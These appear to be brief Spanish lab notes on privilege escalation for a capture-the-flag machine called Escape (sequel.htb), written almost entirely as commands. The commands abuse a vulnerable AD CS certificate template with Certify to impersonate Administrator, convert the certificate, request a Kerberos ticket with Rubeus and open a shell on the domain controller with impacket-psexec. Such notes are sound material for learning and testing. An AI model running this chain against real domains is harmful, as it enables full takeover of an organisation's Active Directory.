
# ESCALADA CON Certify

```bash
#MAQUINA ESCAPE
./Certify.exe find /vulnerable

./Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

./Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:1234 /ptt /nowrap

base64 -d ticket.kirbi.b64 > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticke.ccache

sudo ntpdate -u dc.sequel.htb
export KRB5CCNAME=ticke.ccache

impacket-psexec sequel.htb/administrator@dc.sequel.htb -k -no-pass 
```